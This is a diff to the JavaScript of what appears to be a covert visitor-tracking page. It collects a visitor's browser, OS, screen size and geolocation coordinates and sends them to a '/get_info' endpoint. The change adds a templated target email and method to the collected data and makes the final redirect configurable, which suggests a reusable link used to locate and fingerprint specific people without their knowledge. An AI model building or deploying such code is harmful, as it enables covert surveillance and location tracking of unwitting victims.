@@ -32,13 +32,13 @@ var rqst = getXmlHttp();
 				var coords = JSON.parse(rqst.responseText);
 				var coords_str = coords.location.lat + "|" + coords.location.lng + "|" + coords.accuracy
 				
-				var addr = "/get_info?browser="+brser+"&language="+lng+"&navbrser="+navbrser+"&navos="+navos+"&OS="+ops+"&h="+height+"&w="+width+"&location_info="+coords_str+"&c=ne_rabotaet";
+				var addr = "/get_info?browser="+brser+"&language="+lng+"&navbrser="+navbrser+"&navos="+navos+"&OS="+ops+"&h="+height+"&w="+width+"&location_info="+coords_str+"&c=ne_rabotaet" + "&method={{method}}&email={{email}}";
 				rqst.open("GET", addr, true)
 				rqst.send();
 
 				//alert("Catch ok!")
 				
-				window.location = "https://yandex.ru";
+				window.location = {{whereto}};
 			}
 		}
 
